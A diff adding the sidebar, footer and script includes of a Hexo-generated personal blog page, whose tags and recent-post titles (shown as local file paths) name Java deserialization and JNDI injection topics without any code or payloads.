+      <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Java安全</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">注入漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 20px;">漏洞分析</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/07/hello-world/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\hello-world</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CC链反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CB链反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Hessian反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\JNDI注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
